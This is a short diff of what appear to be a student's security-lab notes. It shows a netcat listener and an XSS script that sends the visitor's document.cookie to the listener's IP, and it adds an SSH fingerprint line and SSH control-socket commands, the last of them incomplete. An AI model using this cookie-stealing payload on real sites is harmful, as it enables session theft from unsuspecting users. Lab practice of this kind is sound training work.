@@ -30,11 +30,12 @@ student@lin-ops:~$ nc -lk 10.50.188.39 42069
 
 <script>document.location="http://10.50.188.39:42069/?username=" + document.cookie;</script>
 
+SHA256:cG1PduaGk/fLmUlWy1xTHIUCC+K9ABIbkAWxZUNMgPI student@lin-ops
 
 
 
-
-
+ssh -MS /tmp/sqldemo demo1@10.50.12.21
+ssh -S /tmp/sqldemo sqldemo -O 
 
 
 
